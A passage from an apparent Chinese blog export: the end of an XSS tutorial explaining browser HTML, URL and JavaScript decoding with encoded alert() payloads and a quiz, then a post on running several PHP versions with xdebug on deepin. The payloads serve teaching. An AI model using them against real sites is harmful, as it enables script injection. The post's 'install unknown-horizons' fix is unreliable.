src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_3\"></p>\n<p>可以看到 ‘(‘ 被解码。</p>\n<h3 id=\"RCDATA状态下的字符引用\"><a href=\"#RCDATA状态下的字符引用\" class=\"headerlink\" title=\"RCDATA状态下的字符引用\"></a>RCDATA状态下的字符引用</h3><p>这时我们需要先了解下 HTML 中的 5 类元素</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">1.</span>  空元素(Void elements)，如&lt;area&gt;,&lt;br&gt;,&lt;base&gt;等等<br><br><span class=\"hljs-number\">2.</span>  原始文本元素(Raw text elements)，有&lt;script&gt;和&lt;style&gt;<br><br><span class=\"hljs-number\">3.</span>  RCDATA元素(RCDATA elements)，有&lt;textarea&gt;和&lt;title&gt;<br><br><span class=\"hljs-number\">4.</span>  外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素<br><br><span class=\"hljs-number\">5.</span>  基本元素(Normal elements)，即除了以上<span class=\"hljs-number\">4</span>种元素以外的元素<br><br>五类元素的区别如下：<br><br><span class=\"hljs-number\">1.</span>  空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。<br><br><span class=\"hljs-number\">2.</span>  原始文本元素，可以容纳文本。<br><br><span class=\"hljs-number\">3.</span>  RCDATA元素，可以容纳文本和字符引用。<br><br><span class=\"hljs-number\">4.</span>  外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释<br><br><span class=\"hljs-number\">5.</span>  基本元素，可以容纳文本、字符引用、其他元素和注释<br></code></pre></td></tr></table></figure>\n\n\n\n<p>由于 RCDATA 状态中可以转义字符实体，那么在像 <strong>textarea</strong> <strong>title</strong> 等标签中就可以字符引用。这里 还有一个特殊的点就是在 <strong>RCDATA</strong> 元素标签 的内容中，遇到 <code>&lt;</code> 后，会进入 <strong>RCADATA小于号状态</strong>，如果紧接着不是<code>/</code>字符的话，就会返回到 <strong>RCDATA状态</strong>。那么也就是说在 <strong>textarea</strong>或者<strong>title</strong>标签中只能认识并解析的标签只有对应的 <strong></strong>或者 <strong></strong>,不会有新标签的产生，也就杜绝了脚本的执行。例如：</p>\n<p><code>&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</code></p>\n<p>是不会执行的。</p>\n<h2 id=\"2、URL-解析\"><a href=\"#2、URL-解析\" class=\"headerlink\" title=\"2、URL 解析\"></a>2、URL 解析</h2><p>同样的，URL 解析器依旧可以看做一个状态机，其解析规则在<a href=\"http://url.spec.whatwg.org/\" target=\"_blank\" rel=\"noopener\">这里</a>。这里只提几个 xss_payload 能涉及到的地方。</p>\n<p>1、首先，资源类型必须是大写字母或者小写字母，否则会进入到无状态类型。那首先就要求资源的协议要保证格式完全的正确,譬如使用 <strong>javascript:</strong> 伪协议时不能使用编码来绕过，因为这会让 URL 解析器跳转到 ‘ 无类型 ’状态，导致资源不能正确解析，我们构造的 payload 也就不能得到正确的执行，我们来看看下面的例子：</p>\n<p><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:alert(1)&quot;&gt;text&lt;/a&gt;</code> 编码了 <strong>javascript</strong>，可以看到无法正确执行。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_4.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_4\"></p>\n<p>从图中可以看出，得到的跳转地址是 <strong><a href=\"http://localhost/javascript:alert(1)\" target=\"_blank\" rel=\"noopener\">http://localhost/javascript:alert(1)</a></strong>，原因就是没有正确的识别资源的协议类型，拼接到了默认地址的后面，导致 payload 无法执行。</p>\n<p>2、其次，URL 编码过程使用的是 UTF-8 编码，如果给 URL 进行别种方式的编码，会导致 URL 解析器不能正确识别。</p>\n<h3 id=\"HTML-中的两种-URL资源的执行\"><a href=\"#HTML-中的两种-URL资源的执行\" class=\"headerlink\" title=\"HTML 中的两种 URL资源的执行\"></a>HTML 中的两种 URL资源的执行</h3><p>我们可以利用伪协议来进行 xss 的反射攻击，而在HTML 标签中有两种 url 的连接类型，一种是 <code>src</code>，一种是 <code>href</code>，我们先来看看两者的区别</p>\n<h4 id=\"1、src\"><a href=\"#1、src\" class=\"headerlink\" title=\"1、src\"></a>1、src</h4><p>src 适用于替换当前元素，是 source 的缩写，指向外部资源的位置，指向的内容会 <strong>自动的</strong> 嵌入到文档中标签的位置。请求 src 资源的时候会将其指向的资源下载并应用到文档内。例如 js 脚本，img 图片，frame 元素等。</p>\n<h4 id=\"2、href\"><a href=\"#2、href\" class=\"headerlink\" title=\"2、href\"></a>2、href</h4><p>href 是 Hypertext Reference 的缩写，指向网络资源的所在位置，是与该页面有关联的，是引用。</p>\n<p><strong>src</strong>与 <strong>href</strong> 的主要区别就是 一个是引入，一个是引用。</p>\n<p>之前在很多地方看到 payload 都有这种 src 引用的格式</p>\n<p><code>&lt;img src=&quot;javascript:alert(0);&quot;&gt;</code></p>\n<p>但是现在在 Chrome 与 Firefox 上实验了下都不能执行。原因就是当下的一部分浏览器<strong>为了防止恶意代码的注入，已经禁用了 src 属性的 javascript 的伪协议</strong>。我们还有一种引入外部 js 文件的 src 利用方式：</p>\n<p><code>&lt;script src=&quot;evil.js&quot;&gt;&lt;/script&gt;</code></p>\n<p>其中 evil.js 中的内容为</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">alert(<span class=\"hljs-name\">/xss/</span>)<span class=\"hljs-comment\">;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"3、-Javascript-解析\"><a href=\"#3、-Javascript-解析\" class=\"headerlink\" title=\"3、 Javascript 解析\"></a>3、 Javascript 解析</h2><p>详见 javascript 的<a href=\"http://www.ecma-international.org/publications/standards/Ecma-262.htm\" target=\"_blank\" rel=\"noopener\">解析规则</a></p>\n<p>因为 js 脚本一般是内嵌在 HTML 页面中的，所以 javascript 的解析容易与 HTML 解析搞混了。Javascript 的解析需要注意的点有下面两点：</p>\n<h3 id=\"script-标签的解析\"><a href=\"#script-标签的解析\" class=\"headerlink\" title=\"script 标签的解析\"></a>script 标签的解析</h3><p>在之前，我们提到过 HTML 中的 5 类元素，其中 <strong>script</strong> 标签属于 <strong>原始文本数据</strong>,。它有个特别的解析属性就是虽然内嵌在了 HTML 界面的数据状态，但是仍然不能解析字符引用。看看下面这个例子：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-meta-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">\"en\"</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"viewport\"</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">\"width=device-width, initial-scale=1.0\"</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">http-equiv</span>=<span class=\"hljs-string\">\"X-UA-Compatible\"</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">\"ie=edge\"</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"handlebars\"><span class=\"xml\"><span class=\"hljs-symbol\">&amp;lt;</span></span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>    <span class=\"hljs-symbol\">&amp;lt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_5\"></p>\n<p>可以看到，里面的字符引用并没有被解码。</p>\n<h3 id=\"unicode-字符编码的解析\"><a href=\"#unicode-字符编码的解析\" class=\"headerlink\" title=\"unicode 字符编码的解析\"></a>unicode 字符编码的解析</h3><p>在之前的基础铺垫的时候提到了 js 中 unicode 的编码问题，那么它们在脚本的什么位置会被解析？又会被解析成什么意思？unicode 大致有以下三个位置会被解析，但是解析的意义有些许不同。</p>\n<h4 id=\"1、字符串中\"><a href=\"#1、字符串中\" class=\"headerlink\" title=\"1、字符串中\"></a>1、字符串中</h4><p>unicode 放在字符串中的时候会被解析，但是只是会解析为常规的字符，不会解释为破坏上下文的特殊意义的字符。请看下例子：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br>      <span class=\"hljs-keyword\">var</span> str = <span class=\"hljs-string\">'\\u0027'</span>;<br>      <span class=\"hljs-built_in\">document</span>.write(str);<br></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_6\"></p>\n<p>可以看到，被编码的单引号只是解释为了单纯的字符，没有破坏 js 的上下文。</p>\n<h4 id=\"2、标识符中\"><a href=\"#2、标识符中\" class=\"headerlink\" title=\"2、标识符中\"></a>2、标识符中</h4><p>标识符包括函数名，属性名等。如果使用 unicode 编码这些数据的话，会被正确解释为上下文中的标识符，可以正确的运行。看下面这个例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">&lt;script&gt;\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074.\\u0077\\u0072\\u0069\\u0074\\u0065(<span class=\"hljs-string\">'test_successfully@'</span>);<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<p>注意这里只编码了 <strong>document</strong> 和 <strong>write</strong>，并没有编码点号，因为测试结果显示无法编码点号进行执行，但这并不影响我们探测，因为一般利用到的函数都等都只是单纯的字母拼接。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_7.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_7\"></p>\n<p>成功解码并执行了打印函数。</p>\n<h4 id=\"３、控制字符\"><a href=\"#３、控制字符\" class=\"headerlink\" title=\"３、控制字符\"></a>３、控制字符</h4><p>当控制字符不在引号包围的时候，例如 <code>(</code> <code>)</code> <code>&#39;</code> <code>&quot;</code>这些字符，裸露在文档外面进行 unicode 编码，js 解析器不能将它们正确的解析为控制字符，仅仅会被解码为标识符亦或是字符串，所以，想要成功执行一个 js 函数，就必须保证括号为 <strong>()</strong>，而不是 <strong>\\u0028 \\u0029</strong>.</p>\n<p>综上，js 在解析 unicode 编码的时候，能赋予非字符意义的地方有且仅有<strong>标识符</strong>这一个位置。</p>\n<h1 id=\"4-解析流的顺序\"><a href=\"#4-解析流的顺序\" class=\"headerlink\" title=\"4@ 解析流的顺序\"></a>4@ 解析流的顺序</h1><p>前端这三大解析器一般是相互配合的，我们需要搞清楚他们配合的顺序，然后对应构造 payload ，才有可能正确的被解码执行。</p>\n<p>一般的解析顺序如下：</p>\n<p><strong>1、HTML 解析</strong></p>\n<p>浏览器从网络堆栈中获取内容后，会触发 HTML 解析器根据解析规则（上文链接）对文章进行词法的解析，在这一步中，所有的<strong>合理的字符引用都会被解码</strong>【合理即能够被解析的位置放入字符引用】，解析完成后 DOM 树就被创建好了。</p>\n<p><strong>2、JS or URL 解析</strong></p>\n<p>为什么第二步的解析顺序不确定呢，这与文档资源类型的顺序有关。其中 Js 解析器 负责文档中内嵌脚本，unicode 编码等的解析，URL 解析器负责解析碰到的 URL 资源的解码。但位置不同，可能会造成不同的解析顺序。试看下两例：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">脚本1：<br> &lt;a href=\"javascript:%61%6c%65%72%74%28%31%29\"&gt;sequence_test&lt;/a&gt; 编码了 alert(1)<br> <br>脚本2：<br>&lt;a href=# onclick=\"window.\\u006f\\u0070\\u0065\\u006e('http://www.baidu.com')\"&gt;sequence_test&lt;/a&gt;   <br>    编码了open<br></code></pre></td></tr></table></figure>\n\n<p>其中</p>\n<p>脚本1先是由 url 解析器解析 href 中的资源，解析完成后进入 js 的上下文，所以 js 解析器再解析 js 的内容。</p>\n<p>脚本2先是由 js 解析器解析 onclick 中的 unicode 编码，编码完成后发现参数是 url 的上下文，这时 url 解析器介入解析。</p>\n<p>可以看到，不同的位置会导致不同的解析顺序。</p>\n<h1 id=\"5-xss-payload-的练习\"><a href=\"#5-xss-payload-的练习\" class=\"headerlink\" title=\"5@ xss_payload 的练习\"></a>5@ xss_payload 的练习</h1><p>下面给出了常见的几种弹窗的方法，通过上面的阅读与学习，来判断下是否可以成功执行代码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">1、  &lt;a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"&gt;&lt;/a&gt;    <br>    url编码了 javascript:alert(1)<br> <br>2、  &lt;a href=\"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29\"&gt;xss_test&lt;/a&gt;   <br>\t字符实体编码了 javascript url 编码了 alert(2)    <br><br>3、  &lt;a href=\"javascript%3aalert(3)\"&gt;test&lt;/a&gt;<br>    url 编码了 ：<br><br>4、  &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;  <br>    字符实体编码了尖括号<br><br>5、  &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; <br>\t字符实体编码了尖括号<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h3><p>1、 无法执行，因为编码了协议</p>\n<p>2、 可以执行，html 先解析字符实体编码 javascript ，url 解析器再解析 alert(2)，位置与格式都允许。</p>\n<p>3、 无法执行，因为协议被编码导致无法正确识别协议。</p>\n<p>4、 无法执行，因为嵌在数据状态内，只能解析字符引用为普通字符串，无特殊意义。</p>\n<p>5、无法执行，首先是因为在数据状态中只能将尖括号转义为字符串，其次 RCDATA 元素中不能嵌入新的标签，嵌入也无法执行代码。</p>\n<p>更多例子附带答案，<a href=\"http://test.attacker-domain.com/browserparsing/answers.txt\" target=\"_blank\" rel=\"noopener\">戳这</a></p>\n<h1 id=\"6-关于-svg-标签中解析-js-代码\"><a href=\"#6-关于-svg-标签中解析-js-代码\" class=\"headerlink\" title=\"6@ 关于 svg 标签中解析 js 代码\"></a>6@ 关于 svg 标签中解析 js 代码</h1><p>上面写道 <strong>svg</strong> 标签属于外部元素，<strong>script</strong> 标签属于原是文本元素，而且也知道 <strong>script</strong> 标签里面是不能转义字符实体编码的，那么我们考虑一下下面这段代码是否可以弹窗：</p>\n<p><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;/xss/)&lt;/script&gt;&lt;/svg&gt;</code></p>\n<p>按我们上面理解的话，<code>&lt;script&gt;</code> 标签下不能解析字符引用，就算可以解析，圆括号这种被放在数据状态下的解码也只能成为字符串，并不能被解析为控制字符。</p>\n<p>所以不能码？上图～</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_8.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_8\"></p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_9.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_9\"></p>\n<p>太夸张了，不仅解码了字符引用，还转换为了控制字符并且弹窗了～</p>\n<p>按照上面的分析，问题绝对就在 <strong>svg</strong> 这个标签上面。</p>\n<p><code>&lt;svg&gt;</code>这个标签 使用 XML 格式定义图形，XML 会解析字符实体，而 w3c 上面给出的这段实例代码中也可以看出 xml 使用的端倪。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-meta-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">svg</span> <span class=\"hljs-attr\">xmlns</span>=<span class=\"hljs-string\">\"http://www.w3.org/2000/svg\"</span> <span class=\"hljs-attr\">version</span>=<span class=\"hljs-string\">\"1.1\"</span> <span class=\"hljs-attr\">height</span>=<span class=\"hljs-string\">\"190\"</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">polygon</span> <span class=\"hljs-attr\">points</span>=<span class=\"hljs-string\">\"100,10 40,180 190,60 10,60 160,180\"</span><br>  <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\">\"fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;\"</span> /&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">svg</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>那么为什么 <strong>script</strong> 标签可以被解析呢？原因就是 <strong>svg</strong> 标签支持 嵌入 <strong>script</strong> 标签。</p>\n<p>这是支持 <strong>script</strong> 标签的<a href=\"https://www.w3.org/TR/SVG11/script.html\" target=\"_blank\" rel=\"noopener\">文档</a>借用引用文章作者的话来讲就是：</p>\n<p>这个 payload 之所以可以执行是因为遵循了 <strong>svg</strong> 和 <strong>xml</strong> 的标准。</p>\n<h1 id=\"7-总结\"><a href=\"#7-总结\" class=\"headerlink\" title=\"7@ 总结\"></a>7@ 总结</h1><p>理解一个漏洞的利用，需要也有必要挖的深些，这样才能更好的从攻与防的角度来构造攻击向量，亦或是根据攻击的思路来构造防御的 waf。</p>\n<p><code>Reference</code>:</p>\n<p><code>https://www.cnblogs.com/polk6/p/html-entity.html</code></p>\n<p><code>https://www.cnblogs.com/liuxianan/p/display-unicode-character-in-html-css-and-js.html</code></p>\n<p><code>https://zhidao.baidu.com/question/583316301.html</code></p>\n<p><code>https://bbs.csdn.net/topics/392055451</code></p>\n<p><code>http://test.attacker-domain.com/browserparsing/answers.txt</code></p>\n<p><code>http://test.attacker-domain.com/browserparsing/tests.html</code></p>\n<p><code>http://bobao.360.cn/learning/detail/292.html</code></p>\n<p><code>https://www.hackersb.cn/hacker/85.html</code></p>\n<p><code>http://www.w3school.com.cn/html5/html_5_svg.asp</code></p>\n<p><code>https://www.w3.org/TR/SVG11/script.html</code></p>\n"},{"title":"deepin 上多版本 php 版本的配置","date":"2019-09-17T16:00:00.000Z","_content":"\n\n## 1@ 前言\n\n之前博客上的一篇文章，稍有改动。\n\n## 2@ 过程\n\n### 2.1 什么是ppa\n\n首先需要了解下**ppa**：\n\n大多数linux的软件管理包，如 centos 的 yum，debain 的 apt 一般都是不断更新自己软件库里面的一些应用，所以我们默认下载到的应当是最新版本的软件，那么如果软件仓库里面的软件被撤下，我们又想下载老版本的时候，就会用到**ppa**这个东西\n\n**ppa**（personal package archive），即个人包档案，里面可以有软件制作者发布的各个版本，一般来说是用来寻找最新版的软件，以防止上述的软件管理包未更新，此处我们用来下载旧包。\n\n由于deepin也是debain系列的系统，所以可以使用ubuntu的添加源的办法来添加ppa源。\n\n首先将源加进到本机的源文件中，然后导入公钥，更新源（如果有依赖需要下一下dirmngr）：\n\n```\necho \"deb http://ppa.launchpad.net/ondrej/php/ubuntu xenial main\" | tee -a /etc/apt/sources.list\n\necho \"deb-src http://ppa.launchpad.net/ondrej/php/ubuntu xenial main\" | tee -a /etc/apt/sources.list\n\napt-key adv --keyserver keyserver.ubuntu.com --recv-keys E5267A6C\n```\n\n添加源如果有问题，加上这句：\n\n```\nsudo apt-get install unknown-horizons\n```\n\n### 2.2 下载php多版本\n\n网上发现了一个不错的文章，里面刚好讲到ubuntu中多版本php的安装，deepin上安装过程大同小异。\n\n```\nsudo apt-get install -y php5.6-common php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml php5.6-gd php5.6-curl php5.6-json php5.6-fpm php5.6-zip php5.6-mcrypt libapache2-mod-php5.6\n\nsudo apt-get install -y php7.0-common php7.0-mbstring php7.0-mcrypt php7.0-mysql php7.0-xml php7.0-gd php7.0-curl php7.0-json php7.0-fpm php7.0-zip php7.0-mcrypt libapache2-mod-php7.0\n\nsudo apt-get install -y php7.1-common php7.1-mbstring php7.1-mcrypt php7.1-mysql php7.1-xml php7.1-gd php7.1-curl php7.1-json php7.1-fpm php7.1-zip php7.1-mcrypt libapache2-mod-php7.1\n```\n\n上述安装了三个版本，分别是**5.6 7.0 7.1**\n\n下面使用**a2enmod a2dismod**命令来开启或禁用系统的某个模块来完成php版本的快速切换。\n\n```\nsudo a2enmod rewrite #开启重写转向\nsudo a2enmod headers\n```\n\n然后在你的shell配置文件 **~./bashrc 或者 ~/.zshrc** 中添加别名来达到快速切换的目的，原理就是禁用其他php模块，激活要使用的php版本\n\n```\nalias php56='sudo a2dismod php7.0 && sudo a2dismod php7.1 && sudo a2enmod php5.6 && sudo service apache2 restart'\nalias php70='sudo a2dismod php5.6 && sudo a2dismod php7.1 && sudo a2enmod php7.0 && sudo service apache2 restart'\nalias php71='sudo a2dismod php5.6 && sudo a2dismod php7.0 && sudo a2enmod php7.1 && sudo service apache2 restart'\n```\n\n然后 `source ~/.zshrc 或者 /.bashrc`\n\n![img](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/DEEPIN/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190522162731.png)\n\n检查版本，默认只显示最高版本，使用上述别名会成功切换php的版本，只不过不会显示在此处。\n\n### 2.3 vscode + xdebug\n\n下个vscode就感觉它的调试十分简便，下面我们来配置下xdebug的断点调试，这里与普通安装php可能有些不同，需注意。\n\n首先，到 xdebug 官网查找对比对应的php版本下的xdebug版本。使用刚刚的别名，切换下不同状态下的php版本，写个 phpinfo() 的脚本来输出到 `https://xdebug.org/wizard.php`,点击 analyse 来分析下应当下载的xdebug版本，这里我直接贴上我的测试结果\n\n```\n5.6 --->20131226\n7.0 --->20151012\n7.1 --->20160303\n```\n\n其实这个强大的网站会自动定位 phpinfo 信息中的配置文件的位置，然后有具体的操作步骤,而生成不同版本对应的 xdebug，下载安装包即可，可以利用 phpize 这个工具来生成对应版本的 xdebug 文件，如果没有可以下载对应版本的扩展：\n\n`sudo apt-get install php5-dev`\n\n**建议扩展从低版本开始下载，因为高版本扩展会优先被识别。**接下来的操作分别是：\n\n- ./configure\n- make\n- make install\n\n然后将对应生成的 xdebug 文件配置信息放到对应 php.ini 文件中：\n\n【这里以5.6 版本为例，其他版本的配置同理，位置 /etc/php/5.6/apache2/php.ini】\n\n将下面这段配置加入到该配置文件中\n\n```\nzend_extension=\"/usr/lib/php/20131226/xdebug.so\"      #之后配置其他版本php的时候只需将这个文件的位置换成上面我贴出的对应文件即可                                                                                                                      \n\nxdebug.remote_enable = 1\n\nxdebug.remote_handler = dbgp\n\nxdebug.remote_mode = req \n\nxdebug.remote_host = 127.0.0.1\n\nxdebug.remote_port = 9002\n\nxdebug.remote_enable = 1\n\nxdebug.remote_autostart = 1\n```\n\n然后保存，在对应版本的php-ini中末尾填上`[xdebug]` 来激活xdebug扩展。\n\n最后重启，php56,来检查下是否配置成功。\n\n![img](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/DEEPIN/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190522164713.png)\n\n配置成功！愉快的去审计叭～\n\n## 3 @ 总结\n\n推荐下黄老板和比伯的新歌 **<I Don’t care>**，已经被洗脑了。真好～\n\nReference：\n\n`https://www.jianshu.com/p/dedd2818c7f9`\n\n`https://zhidao.baidu.com/question/1670867120091087107.html`\n\n`https://blog.csdn.net/zhousmq/article/details/77765451`\n\n`https://www.cnblogs.com/wangshuyi/p/8512036.html`\n","source":"_posts/deepin下多版本php的配置.md","raw":"---\ntitle: deepin 上多版本 php 版本的配置\ntags:\n\n - deepin\n - 环境\ndate: 2019-09-18\n---\n\n\n## 1@ 前言\n\n之前博客上的一篇文章，稍有改动。\n\n## 2@ 过程\n\n### 2.1 什么是ppa\n\n首先需要了解下**ppa**：\n\n大多数linux的软件管理包，如 centos 的 yum，debain 的 apt 一般都是不断更新自己软件库里面的一些应用，所以我们默认下载到的应当是最新版本的软件，那么如果软件仓库里面的软件被撤下，我们又想下载老版本的时候，就会用到**ppa**这个东西\n\n**ppa**（personal package 